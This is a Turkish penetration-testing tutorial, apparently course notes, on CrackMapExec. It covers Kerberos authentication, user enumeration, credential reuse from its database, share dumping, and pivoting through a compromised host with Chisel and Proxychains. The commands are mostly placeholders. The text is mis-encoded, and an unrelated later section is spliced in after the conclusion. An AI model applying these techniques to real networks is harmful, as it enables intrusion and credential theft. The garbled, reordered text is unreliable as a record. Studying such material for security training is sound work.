Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

